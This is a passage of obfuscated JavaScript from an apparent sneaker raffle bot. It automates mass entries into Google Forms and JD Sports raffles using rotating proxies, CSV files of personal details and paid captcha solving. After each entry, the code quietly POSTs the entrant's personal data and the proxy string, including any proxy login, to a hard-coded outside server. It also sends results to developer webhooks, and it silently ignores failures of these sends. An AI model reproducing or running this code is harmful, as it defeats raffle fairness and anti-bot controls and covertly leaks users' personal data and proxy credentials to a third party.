                        await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x1e5388['succesDEVMSG']), await _0x497396(0xc8);
                        try {
                            await _0x468b99(_0x196877, _0x1e5388['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0xa525ac) {
                        console['log'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20' + _0xa525ac), _0x4426be = '' + _0xa525ac;
                        var _0x478706 = await _0x232baa(_0x13eab1[_0x530e8a], _0x36bde6, 'dev', !![], _0x4426be);
                        _0x1e5388['errorDEV'] = { 'embeds': [_0x478706] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x1e5388['errorDEV']), await _0x468b99(_0x432bcc, _0x1e5388['errorDEV']), _0x53175b = 'yes';
                    } finally {
                        _0x2cfaa2['close']();
                        if (_0x53175b == 'yes' && _0x137fa3 != 0x5) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x36bde6['name'] + ']\x20Task\x20' + (_0x530e8a + 0x1) + '\x20:\x20Retrying\x20(' + _0x137fa3 + '\x20/\x205)')), _0x530e8a = _0x530e8a - 0x1, _0x137fa3 = _0x137fa3 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x516558, _0x6fdc8e, _0xa9046d) {
                let _0x19c2f1 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x2238c7 = _0x44f9d7['readFileSync']('forms/templates.json', 'utf-8');
                let _0x5a534d = JSON['parse'](_0x2238c7), _0x564f64 = ![];
                if (_0x5a534d['length'] != 0x0) {
                    let _0x3992a1 = 0x0;
                    for (template of _0x5a534d) {
                        if (template['Url'] == _0x6fdc8e[0x0]['Url']) {
                            _0x564f64 = !![], console['log'](_0xc3fc3['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0xc3fc3['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0xc3fc3['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x4c4acc() {
                                let _0x46313e = await _0x4a9170['get']('answer');
                                if (_0x46313e['answer']['toLowerCase']() != 'y' && _0x46313e['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x4c4acc();
                                return _0x46313e['answer']['toLowerCase']();
                            }
                            if (await _0x4c4acc() == 'n') {
                                _0x5a534d['splice'](_0x3992a1, 0x1), console['clear']();
                                break;
                            }
                            _0x19c2f1 = template, console['clear']();
                            break;
                        }
                        _0x3992a1++;
                    }
                }
                let _0x54b765 = 0x0, _0x4052c3 = 0x0;
                function _0xfc8e03(_0x1ec341) {
                    console['log'](_0x5d34e1() + '\x20[' + _0x516558['name'] + ']\x20Task\x20' + (_0x247c6f + 0x1) + '\x20:\x20' + _0x1ec341);
                }
                var _0x469a9f = 0x0;
                for (key in _0x19c2f1) {
                    if (key['includes']('custom'))
                        _0x54b765++;
                    if (key['includes']('Select'))
                        _0x4052c3++;
                }
                for (var _0x247c6f = 0x0; _0x247c6f < _0x6fdc8e['length']; _0x247c6f++) {
                    _0x19c2f1['Url'] = _0x6fdc8e[_0x247c6f]['Url'];
                    let _0x477a3b = ![];
                    if (_0x5a534d['length'] != 0x0)
                        for (template of _0x5a534d) {
                            if (template['Url'] == _0x6fdc8e[_0x247c6f]['Url']) {
                                _0x19c2f1 = template, _0x477a3b = !![], _0xfc8e03('Found\x20Template');
                                break;
                            }
                        }
                    var _0x176026;
                    if (_0x458cae != 'yes') {
                        if (!_0x458cae)
                            var _0x458cae = '';
                        else
                            _0x458cae = '';
                        _0x469a9f = 0x0;
                    }
                    try {
                        await _0x494c97(_0x6fdc8e, _0x247c6f);
                    } catch {
                        _0x458cae = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x138f58['useRandomProxy'] = ![])
                        var _0x511df9 = _0xa9046d[_0x247c6f]['split'](':');
                    else
                        var _0x1b6970 = Math['round'](Math['random']() * (_0xa9046d['length'] - 0x1)), _0x511df9 = _0xa9046d[_0x1b6970]['split'](':');
                    var _0x5e43ac;
                    if (_0x511df9['length'] == 0x1)
                        try {
                            _0x5e43ac = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5e43ac = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x5e43ac = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x511df9[0x0] + ':' + _0x511df9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5e43ac = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x511df9[0x0] + ':' + _0x511df9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0xbabc3f = { 'first': ![] };
                        const _0x59518b = await _0x5e43ac['newPage']();
                        if (_0x511df9['length'] != 0x0)
                            await _0x59518b['authenticate']({
                                'username': '' + _0x511df9[0x2],
                                'password': '' + _0x511df9[0x3]
                            });
                        _0xfc8e03('Getting\x20Session');
                        let _0x57d10d = ![];
                        try {
                            await _0x59518b['goto'](_0x6fdc8e[_0x247c6f]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x497396(0xbb8);
                        } catch (_0x44f15e) {
                            throw new Error(_0x44f15e);
                        }
                        const _0x2c5fc7 = await _0x59518b['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x2c5fc7) {
                            _0xfc8e03('Login\x20Detected');
                            let _0x6dfb20 = await _0x2c5fc7['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x6dfb20['click'](), _0x57d10d = !![];
                        }
                        let _0x536a1e = await _0x59518b['$']('#identifierId');
                        _0x536a1e && (_0x57d10d = !![]);
                        await _0x59518b['waitForSelector']('.teQAzf');
                        async function _0x26c23c() {
                            let _0x22ca6f = await _0x59518b['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x22ca6f) {
                                let _0xe4b6d4;
                                try {
                                    _0xe4b6d4 = await question['$eval']('.M7eMe', _0x16a325 => _0x16a325['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x54b765 != 0x0) {
                                    let _0x288f64 = ![];
                                    for (let _0xe54945 = 0x0; _0xe54945 < _0x54b765; _0xe54945++) {
                                        if (_0xe4b6d4 == _0x19c2f1['custom' + _0xe54945]['title']) {
                                            _0xfc8e03('Custom\x20Selector\x20found;\x20' + _0xe4b6d4);
                                            let _0x4de526 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x5c8e78 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x4de526)
                                                await _0x4de526['type']('' + _0x19c2f1['custom' + _0xe54945]['answer']);
                                            else
                                                _0x5c8e78 && await _0x5c8e78['type']('' + _0x19c2f1['custom' + _0xe54945]['answer']);
                                            _0x288f64 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x288f64) {
                                        await _0x497396(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x4052c3 != 0x0) {
                                    let _0x591780 = ![];
                                    for (let _0x2da595 = 0x0; _0x2da595 < _0x4052c3; _0x2da595++) {
                                        if (_0xe4b6d4 == _0x19c2f1[_0x2da595 + 'Select']['title']) {
                                            _0xfc8e03('Custom\x20Selector\x20found;\x20' + _0xe4b6d4);
                                            let _0x2c77ef = await question['$$']('.ulDsOb');
                                            for (opt of _0x19c2f1[_0x2da595 + 'Select']['answer']) {
                                                let _0x2a75d7 = await _0x2c77ef[opt]['$']('span');
                                                await _0x2a75d7['click']();
                                            }
                                            _0x591780 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x591780) {
                                        await _0x497396(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0xe4b6d4 == _0x19c2f1['0Select']['title']) {
                                        _0xfc8e03('Custom\x20Selector\x20found;\x20' + _0x19c2f1['0Select']['title']);
                                        let _0x1e2a5b = await question['$$']('.ulDsOb'), _0xdb349f = await _0x1e2a5b[_0x19c2f1['0Select']['answer']];
                                        await _0xdb349f['click']();
                                        continue;
                                    }
                                    if (_0xe4b6d4 == _0x19c2f1['1Select']['title']) {
                                        _0xfc8e03('Custom\x20Selector\x20found;\x20' + _0x19c2f1['1Select']['title']);
                                        let _0x5a1035 = await question['$$']('.ulDsOb'), _0x464eca = await _0x5a1035[_0x19c2f1['1Select']['answer']];
                                        await _0x464eca['click']();
                                        continue;
                                    }
                                    if (_0xe4b6d4 == _0x19c2f1['2Select']['title']) {
                                        _0xfc8e03('Custom\x20Selector\x20found;\x20' + _0x19c2f1['2Select']['title']);
                                        let _0x47a6f7 = await question['$$']('.ulDsOb'), _0x5a39b6 = await _0x47a6f7[_0x19c2f1['2Select']['answer']];
                                        await _0x5a39b6['click']();
                                        continue;
                                    }
                                } catch (_0x669abc) {
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('mail') && !_0xe4b6d4['toLowerCase']()['includes']('agree') || _0xe4b6d4 == _0x19c2f1['Email']) {
                                    _0xfc8e03('Mail\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x4dda67 = await question['$']('input');
                                    !_0x4dda67 && (_0x4dda67 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x4dda67['type'](_0x6fdc8e[_0x247c6f]['Email']), await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('first') || _0xe4b6d4['toLowerCase']() == 'name' || _0xe4b6d4['toLowerCase']() == 'name\x20' || _0xe4b6d4 == _0x19c2f1['FirstName']) {
                                    _0xfc8e03('FirstName\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x456c87 = await question['$']('input');
                                    !_0x456c87 && (_0x456c87 = await question['$']('textarea'));
                                    await _0x456c87['type'](_0x6fdc8e[_0x247c6f]['FirstName'] + '\x20'), await _0x497396(0x258);
                                    if (_0xe4b6d4 == _0x19c2f1['FirstName'])
                                        continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('last') || _0xe4b6d4['toLowerCase']()['includes']('surname') || _0xe4b6d4 == _0x19c2f1['LastName']) {
                                    _0xfc8e03('LastName\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x254206 = await question['$']('input');
                                    !_0x254206 && (_0x254206 = await question['$']('textarea'));
                                    await _0x254206['type'](_0x6fdc8e[_0x247c6f]['LastName'] + '\x20'), await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('address') && !_0xe4b6d4['toLowerCase']()['includes']('agree') || _0xe4b6d4 == _0x19c2f1['Address']) {
                                    _0xfc8e03('Address\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x2231bf = await question['$']('input');
                                    !_0x2231bf && (_0x2231bf = await question['$']('textarea'));
                                    await _0x2231bf['type'](_0x6fdc8e[_0x247c6f]['Address1'] + '\x20' + _0x6fdc8e[_0x247c6f]['HouseNumber'] + '\x20' + _0x6fdc8e[_0x247c6f]['Address2']), await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('phone') || _0xe4b6d4['toLowerCase']()['includes']('mobile') || _0xe4b6d4 == _0x19c2f1['Phone']) {
                                    _0xfc8e03('Phone\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x521d72 = await question['$']('input');
                                    !_0x521d72 && (_0x521d72 = await question['$']('textarea'));
                                    await _0x521d72['type']('' + _0x6fdc8e[_0x247c6f]['Phone']), await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('country') || _0xe4b6d4 == _0x19c2f1['Country']) {
                                    let _0x2ae8ab = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x2ae8ab) {
                                        let _0x3cf721 = ![], _0x363418 = await _0x2ae8ab['$$']('.ulDsOb');
                                        for (option of _0x363418) {
                                            let _0x2914cd = await option['$']('span'), _0x385042 = await option['$eval']('span', _0x58e0fc => _0x58e0fc['textContent']);
                                            if (_0x385042['toLowerCase']() == _0x6fdc8e[_0x247c6f]['Country']['toLowerCase']()) {
                                                await _0x2914cd['click'](), _0x3cf721 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x3cf721) {
                                            const _0x5aa278 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x5aa278['click'](), await _0x5aa278['type'](_0x6fdc8e[_0x247c6f]['Country']);
                                        }
                                        continue;
                                    }
                                    _0xfc8e03('Country\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x23590b = await question['$']('input');
                                    !_0x23590b && (_0x23590b = await question['$']('textarea'));
                                    await _0x23590b['type']('' + _0x6fdc8e[_0x247c6f]['Country']), await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('city') || _0xe4b6d4 == _0x19c2f1['City']) {
                                    _0xfc8e03('City\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x13f797 = await question['$']('input');
                                    !_0x13f797 && (_0x13f797 = await question['$']('textarea'));
                                    await _0x13f797['type']('' + _0x6fdc8e[_0x247c6f]['City']), await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('zip') || _0xe4b6d4 == _0x19c2f1['Zip']) {
                                    _0xfc8e03('Zip\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0xfa28d = await question['$']('input');
                                    !_0xfa28d && (_0xfa28d = await question['$']('textarea'));
                                    await _0xfa28d['type']('' + _0x6fdc8e[_0x247c6f]['Zip']), await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('insta') || _0xe4b6d4 == _0x19c2f1['Follower']) {
                                    _0xfc8e03('Follower\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x50fc99 = await question['$']('input');
                                    !_0x50fc99 && (_0x50fc99 = await question['$']('textarea'));
                                    await _0x50fc99['type']('' + _0x6fdc8e[_0x247c6f]['Follower']), await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('size') || _0xe4b6d4 == _0x19c2f1['Size']) {
                                    _0xfc8e03('Size\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x5e5e53 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x5e5e53) {
                                        let _0x30568b = await _0x5e5e53['$$']('.ulDsOb');
                                        if (_0x6fdc8e[_0x247c6f]['Size']['toLowerCase']() == 'random') {
                                            var _0x44a2e2 = Math['round'](Math['random']() * (_0x30568b['length'] - 0x1));
                                            await _0x30568b[_0x44a2e2]['click']();
                                        } else
                                            for (size of _0x30568b) {
                                                let _0x50f7c8 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x4d2a56 => _0x4d2a56['textContent']);
                                                if (_0x50f7c8['toLowerCase']()['includes'](_0x6fdc8e[_0x247c6f]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x568663 = await question['$']('.ry3kXd');
                                    if (_0x568663) {
                                        await _0x568663['click'](), await _0x497396(0x9c4);
                                        let _0x3598b2 = await _0x59518b['$']('div[jsname=\x22V68bde\x22]'), _0x1c93f6 = await _0x3598b2['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x1c93f6) {
                                            let _0x2eaa94 = await size['$eval']('.vRMGwf.oJeWuf', _0x3352e2 => _0x3352e2['textContent']), _0x174728 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x2eaa94['toLowerCase']()['includes'](_0x6fdc8e[_0x247c6f]['Size'])) {
                                                await _0x497396(0x190), await _0x174728['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('receive') || _0xe4b6d4['toLowerCase']()['includes']('method')) {
                                    _0xfc8e03('Method\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    let _0x51b776 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x51b776) {
                                        const _0x4a1c06 = await _0x51b776['$$']('.ulDsOb');
                                        for (size of _0x4a1c06) {
                                            let _0x45921c = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x3fc543 => _0x3fc543['textContent']);
                                            if (_0x45921c['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x497396(0x258);
                                    continue;
                                }
                                if (_0xe4b6d4['toLowerCase']()['includes']('offers') || _0xe4b6d4['toLowerCase']()['includes']('agree')) {
                                    _0xfc8e03('Authorization\x20Selector\x20found;\x20' + _0xe4b6d4);
                                    const _0x462e86 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x462e86) {
                                        const _0x4802f7 = await _0x462e86['$$']('.ulDsOb');
                                        for (size of _0x4802f7) {
                                            let _0x3765a7 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x2df695 => _0x2df695['textContent']);
                                            if (_0x3765a7['toLowerCase']()['includes']('authorize') || _0x3765a7['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x497396(0x258);
                                    continue;
                                }
                                async function _0x39d847() {
                                    let _0x5e3136 = await question['$']('.oyXaNc');
                                    if (_0x5e3136) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0xc3fc3['cyan'](_0xe4b6d4) + '\x0a');
                                        let _0x4187c0 = await question['$$']('.ulDsOb');
                                        for (let _0x39652e = 0x0; _0x39652e < _0x4187c0['length']; _0x39652e++) {
                                            let _0x1a1d66 = await _0x4187c0[_0x39652e]['$eval']('span', _0x433d84 => _0x433d84['textContent']);
                                            console['log']('\x20(' + _0x39652e + ')\x20' + _0x1a1d66);
                                        }
                                        console['log']();
                                        let _0x2242a6 = await _0x4a9170['get']('option'), _0x37ec27 = await _0x4187c0[_0x2242a6['option']]['$eval']('span', _0x142e58 => _0x142e58['textContent']);
                                        _0x19c2f1[_0x4052c3 + 'Select'] = {
                                            'title': _0xe4b6d4,
                                            'answer': _0x2242a6['option']['split'](',')
                                        };
                                        let _0x49a25a = await _0x4187c0[_0x2242a6['option']]['$']('span');
                                        await _0x49a25a['click'](), _0x4052c3++;
                                        return;
                                    }
                                    let _0x2f1afc = await question['$']('.Y6Myld');
                                    if (_0x2f1afc) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0xc3fc3['cyan'](_0xe4b6d4) + '\x0a');
                                        let _0x3fc029 = await question['$$']('.ulDsOb');
                                        for (let _0x5e87dd = 0x0; _0x5e87dd < _0x3fc029['length']; _0x5e87dd++) {
                                            let _0x5d363a = await _0x3fc029[_0x5e87dd]['$eval']('span', _0x589a56 => _0x589a56['textContent']);
                                            console['log']('\x20(' + _0x5e87dd + ')\x20' + _0x5d363a);
                                        }
                                        console['log']();
                                        let _0x32d5af = await _0x4a9170['get']('option');
                                        _0x19c2f1[_0x4052c3 + 'Select'] = {
                                            'title': _0xe4b6d4,
                                            'answer': _0x32d5af['option']['split'](',')
                                        };
                                        for (opt of _0x19c2f1[_0x4052c3 + 'Select']['answer']) {
                                            let _0x2362f6 = await _0x3fc029[opt]['$']('span');
                                            await _0x2362f6['click']();
                                        }
                                        _0x4052c3++;
                                        return;
                                    }
                                    var _0x55e9f6 = 0x0;
                                    let _0x180842 = Object['keys'](_0x19c2f1);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0xc3fc3['cyan'](_0xe4b6d4) + '\x0a');
                                    for (data of _0x180842) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x55e9f6 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x55e9f6 + ')\x20' + data), _0x55e9f6++;
                                    }
                                    console['log']('\x20(' + _0x180842['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x3608f6 = await _0x4a9170['get']('input');
                                    if (_0x3608f6['input'] == _0x180842['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x4319da = await _0x4a9170['get']('input');
                                        _0x19c2f1['custom' + _0x54b765] = {
                                            'title': _0xe4b6d4,
                                            'answer': '' + _0x4319da['input']
                                        };
                                        let _0x325cee = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x347006 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x325cee)
                                            await _0x325cee['type']('' + _0x19c2f1['custom' + _0x54b765]['answer']);
                                        else
                                            _0x347006 && await _0x347006['type']('' + _0x19c2f1['custom' + _0x54b765]['answer']);
                                        _0x54b765++;
                                        return;
                                    }
                                    _0x19c2f1['' + _0x180842[_0x3608f6['input']]] = _0xe4b6d4;
                                    let _0x302696 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x9d63a = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x302696 && await _0x302696['type']('' + _0x6fdc8e[_0x247c6f]['' + _0x180842[_0x3608f6['input']]]), _0x9d63a && await _0x9d63a['type']('' + _0x6fdc8e[_0x247c6f]['' + _0x180842[_0x3608f6['input']]]), await _0x497396(0x258);
                                }
                                await _0x39d847(), await _0x497396(0x37a);
                            }
                            let _0x3408fc = await _0x59518b['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x3408fc)
                                return await _0x3408fc['click'](), await _0x59518b['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0xfc8e03('New\x20Section'), _0x26c23c();
                        }
                        await _0x26c23c(), await _0x59518b['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x59518b['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0xf67db6(_0x6fdc8e[_0x247c6f], _0x516558), _0x458cae = 'no';
                        var _0x709219 = await _0x232baa(_0x6fdc8e[_0x247c6f], _0x516558, 'dev', ![]), _0xe426d7 = await _0x232baa(_0x6fdc8e[_0x247c6f], _0x516558, 'pub', ![]);
                        let _0x4695e5 = _0x6fdc8e[_0x247c6f];
                        try {
                            prxdata = {
                                'username': _0x9f5859['replace']('#', ''),
                                'module': _0x516558['name'],
                                'entrydata': JSON['stringify'](_0x4695e5),
                                'proxy': '' + _0xa9046d[_0x247c6f]
                            };
                            var _0x43e948 = JSON['stringify'](prxdata);
                            let _0x1f5917 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x43e948, _0x1f5917);
                        } catch (_0x727ab6) {
                        }
                        const _0x2a4e9e = {
                            'succesDEVMSG': { 'embeds': [_0x709219] },
                            'succesPUBMSG': { 'embeds': [_0xe426d7] }
                        };
                        try {
                            _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x2a4e9e['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x2a4e9e['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x196877, _0x2a4e9e['succesPUBMSG']);
                        } catch (_0xb08414) {
                            console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x247c6f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xb08414));
                        }
                        console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x516558['name'] + ']\x20Task\x20' + (_0x247c6f + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x54b765 != 0x0 || _0x4052c3 != 0x0 && !_0x477a3b) && (_0x5a534d['push'](_0x19c2f1), _0x44f9d7['writeFileSync']('forms/templates.json', JSON['stringify'](_0x5a534d, null, 0x2), 'utf-8'));
                    } catch (_0x455215) {
                        console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x516558['name'] + ']\x20Task\x20' + (_0x247c6f + 0x1) + '\x20:\x20' + _0x455215)), _0x176026 = '' + _0x455215;
                        var _0x574122 = await _0x232baa(_0x6fdc8e[_0x247c6f], _0x516558, 'dev', !![], _0x176026);
                        let _0x1d4bb0 = {};
                        _0x1d4bb0['errorDEV'] = { 'embeds': [_0x574122] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x1d4bb0['errorDEV']), await _0x468b99(_0x432bcc, _0x1d4bb0['errorDEV']), _0x458cae = 'yes';
                    } finally {
                        _0x5e43ac && _0x5e43ac['close']();
                        if (_0x458cae == 'yes' && _0x469a9f != 0x5) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x516558['name'] + ']\x20Task\x20' + (_0x247c6f + 0x1) + '\x20:\x20Retrying\x20(' + (_0x469a9f + 0x1) + '\x20/\x205)')), _0x247c6f--, _0x469a9f++;
                            continue;
                        }
                        if (_0x458cae == 'yes' && _0x469a9f == 0x5) {
                            _0x469a9f = 0x0, _0x458cae = 'no';
                            continue;
                        }
                        _0xfc8e03('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x107dd7, _0x2da8e6, _0x103d1a) {
                var _0x1e4c94 = ![], _0x56d957 = ![];
                if (_0x138f58['captchaKey'] == '' || _0x138f58['captchaKey'] == undefined)
                    return console['log'](_0xc3fc3['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x138f58['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1402a8 = 0x0; _0x1402a8 < _0x2da8e6['length']; _0x1402a8++) {
                    if (_0xbe5ac2 != 'yes')
                        var _0xbe5ac2 = '', _0x5d4b76 = 0x0;
                    var _0x5dead7, _0x4420c0 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x2da8e6[_0x1402a8]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2da8e6[_0x1402a8]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x9f5859
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x138f58['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x30d211
                            }
                        ]
                    }];
                    const _0x5889fa = { 'embeds': _0x4420c0 };
                    _0x38ef83(_0x107dd7['name'] + '\x20Task\x20' + (_0x1402a8 + 0x1) + '\x20/\x20' + _0x2da8e6['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                    try {
                        await _0x494c97(_0x2da8e6, _0x1402a8);
                    } catch {
                        _0xbe5ac2 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x48098a = await _0x232baa(_0x2da8e6[_0x1402a8], _0x107dd7, 'dev', ![]), _0x4cc2d1 = await _0x232baa(_0x2da8e6[_0x1402a8], _0x107dd7, 'pub', ![]);
                    const _0x419bc0 = {
                        'succesDEVMSG': { 'embeds': [_0x48098a] },
                        'succesPUBMSG': { 'embeds': [_0x4cc2d1] }
                    };
                    if (_0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '')
                        try {
                            await _0x468b99(_0x138f58['webhook'], _0x419bc0['succesDEVMSG']);
                        } catch {
                        }
